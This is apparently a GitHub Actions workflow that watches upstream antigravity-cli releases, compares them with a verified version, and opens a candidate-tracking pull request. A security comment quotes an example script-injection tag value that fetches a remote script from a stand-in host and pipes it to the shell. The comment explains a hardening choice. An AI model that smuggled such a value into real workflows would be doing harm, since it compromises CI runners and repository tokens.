name: agy Version Watch

on:
  schedule:
    - cron: '17 19 * * *'
  workflow_dispatch:

concurrency:
  group: agy-version-watch
  cancel-in-progress: false

permissions:
  contents: write
  pull-requests: write

jobs:
  intake:
    runs-on: ubuntu-latest
    steps:
      - uses: actions/checkout@v6
        with:
          ref: main
          fetch-depth: 0
          token: ${{ github.token }}

      - uses: actions/setup-node@v5
        with:
          node-version: '22'

      - name: Fetch upstream latest version (google-antigravity)
        id: latest
        run: |
          set -eu
          latest=$(gh api repos/google-antigravity/antigravity-cli/releases/latest --jq '.tag_name')
          if [ -z "$latest" ]; then
            echo "ERROR: Failed to fetch latest version from upstream" >&2
            exit 1
          fi
          echo "version=$latest" >> "$GITHUB_OUTPUT"
          echo "Upstream latest: $latest"
        env:
          GH_TOKEN: ${{ github.token }}

      - name: Check current verified version
        id: verified
        run: |
          set -eu
          verified=$(node -p "require('./config/agy-verified-versions.json').verified_version")
          echo "version=$verified" >> "$GITHUB_OUTPUT"
          echo "Current verified version: $verified"

      - name: Determine mode (skip_uptodate / skip_pending / new_intake)
        id: mode
        # SECURITY: the values referenced by ${{ steps.*.outputs.* }} originate
        # from an upstream (google-antigravity/antigravity-cli) release tag_name,
        # which is third-party-controlled input. Interpolating it directly into
        # a `run:` shell block via ${{ }} template substitution is a known GitHub
        # Actions script-injection vector (a tag_name like `"; curl evil.sh | sh #`
        # would be spliced into the script *before* the shell ever parses it).
        # Passing it through `env:` instead means the shell only ever sees it as
        # the *value* of a variable, never as script text.
        # https://docs.github.com/en/actions/security-guides/security-hardening-for-github-actions#understanding-the-risk-of-script-injections
        env:
          LATEST_RAW: ${{ steps.latest.outputs.version }}
          VERIFIED_RAW: ${{ steps.verified.outputs.version }}
          GH_TOKEN: ${{ github.token }}
        run: |
          set -eu
          # Strip a possible 'v' prefix before comparing, since
          # config/agy-verified-versions.json.verified_version and
          # candidateMeta.tag_name (written by prepare-agy-candidate.js via
          # normalizeVersion()) are always stored without it. Without this,
          # an upstream tag like "v1.0.16" would never match an already
          # verified "1.0.16" and would be misdetected as new_intake forever.
          latest="${LATEST_RAW#v}"
          verified="${VERIFIED_RAW#v}"
          branch="automation/agy-${latest}"

          echo "latest_normalized=$latest" >> "$GITHUB_OUTPUT"
          echo "branch=$branch" >> "$GITHUB_OUTPUT"

          # No --repo: rely on gh's ambient repo detection from the checked-out
          # git remote, so this workflow behaves correctly if ever run from a
          # fork or a renamed repo instead of hardcoding bash0816/agy-termux.
          pr_count=$(gh pr list --base main --head "$branch" --state open --json number --jq 'length')
          if [ "$latest" = "$verified" ]; then
            echo "mode=skip_uptodate" >> "$GITHUB_OUTPUT"
            echo "Already verified: $latest == $verified"
          elif [ "$pr_count" -gt 0 ]; then
            echo "mode=skip_pending" >> "$GITHUB_OUTPUT"
            echo "Open PR already exists for $latest"
          else
            echo "mode=new_intake" >> "$GITHUB_OUTPUT"
            echo "New version to intake: $latest"
          fi

      - name: Prepare candidate metadata
        if: steps.mode.outputs.mode == 'new_intake'
        env:
          # See the script-injection note on the "Determine mode" step above -
          # same reasoning applies here.
          VERSION_RAW: ${{ steps.latest.outputs.version }}
          # Passed through so scripts/prepare-agy-candidate.js can send an
          # Authorization header on its api.github.com call, avoiding the
          # unauthenticated 60 req/hour/IP rate limit on shared GitHub-hosted
          # runners (which is otherwise shared across many workflows/repos).
          GH_TOKEN: ${{ github.token }}
        run: |
          set -eu
          # Intentionally the RAW upstream tag (not normalized): the GitHub
          # releases/tags/<tag> API lookup inside prepare-agy-candidate.js
          # needs the exact tag string as it exists on GitHub. The script
          # normalizes internally for the tag_name field it writes out.
          version="$VERSION_RAW"
          node scripts/prepare-agy-candidate.js "$version" > /tmp/candidate.json
          echo "Candidate metadata:"
          cat /tmp/candidate.json

      - name: Update candidate config
        if: steps.mode.outputs.mode == 'new_intake'
        run: |
          set -eu
          node scripts/update-agy-candidate-config.js < /tmp/candidate.json
          echo "Candidate config updated"

      - name: Commit and create PR
        if: steps.mode.outputs.mode == 'new_intake'
        env:
          # See the script-injection note on the "Determine mode" step above -
          # same reasoning applies here.
          LATEST_NORMALIZED: ${{ steps.mode.outputs.latest_normalized }}
          BRANCH: ${{ steps.mode.outputs.branch }}
          GH_TOKEN: ${{ github.token }}
        run: |
          set -eu
          # Reuse the same normalized version / branch computed in the
          # "Determine mode" step (rather than recomputing from the raw
          # upstream tag here) so the branch this step pushes to is always
          # identical to the branch the mode step's `gh pr list` check
          # looked for. Recomputing independently risked drifting apart if
          # upstream ever used a v-prefixed tag (e.g. mode step checks
          # automation/agy-1.0.16 but this step pushes automation/agy-v1.0.16).
          version="$LATEST_NORMALIZED"
          branch="$BRANCH"

          git config user.name "github-actions[bot]"
          git config user.email "41898282+github-actions[bot]@users.noreply.github.com"
          git checkout -B "$branch" origin/main
          git add config/agy-candidate-version.json
          git diff --cached --quiet && echo "No changes to commit" && exit 0
          git commit -m "Track agy ${version} candidate"
          git push --force-with-lease origin "$branch"

          # Prepare PR body with candidate metadata.
          # Built with `{ ... } > file` + `gh pr create --body-file` (instead of
          # nested $(...) / heredoc string concatenation) to avoid quoting hazards.
          candidate=$(cat config/agy-candidate-version.json)
          sha256_tar=$(echo "$candidate" | jq -r '.sha256_tar')
          sha256_bin=$(echo "$candidate" | jq -r '.sha256_binary')
          va39_counts=$(echo "$candidate" | jq -c '.va39_patch_counts')
          va39_regression_count=$(echo "$candidate" | jq '.va39_patch_regression | length')

          pr_body_file=$(mktemp)
          {
            echo "Automated upstream agy intake from google-antigravity/antigravity-cli"
            echo ""
            echo "**Candidate Version:** ${version}"
            echo "**SHA256 (tarball):** \`${sha256_tar}\`"
            echo "**SHA256 (binary):** \`${sha256_bin}\`"
            echo "**VA39 Patch Counts:** \`${va39_counts}\`"
            if [ "$va39_regression_count" -gt 0 ]; then
              echo ""
              echo "⚠️ **VA39 Patch Regression Detected:**"
              echo "$candidate" | jq -r '.va39_patch_regression[] | "- " + .'
            fi
            echo ""
            echo "**Action Required:**"
            echo "⚠️ Device A/B TUI verification is mandatory. After verification:"
            echo ""
            echo "1. Run manual verification on devices"
            echo "2. Once verified, execute:"
            echo '   ```'
            echo "   scripts/promote-agy-candidate.js ${version} --confirm-device-verified"
            echo '   ```'
            echo "3. Commit and merge the promotion PR"
            echo "4. Only then: \`npm publish\`"
            echo ""
            echo "⚠️ **Do not npm publish until device verification is complete and promotion script executed.**"
            echo "⚠️ **This PR does not trigger npm publish - manual steps required.**"
          } > "$pr_body_file"

          # No --repo: rely on gh's ambient repo detection (see note above).
          existing=$(gh pr list --base main --head "$branch" --state open --json number --jq 'length')
          if [ "$existing" -eq 0 ]; then
            gh pr create \
              --base main \
              --head "$branch" \
              --title "Track agy ${version} candidate" \
              --reviewer bash0816 \
              --body-file "$pr_body_file"
          fi
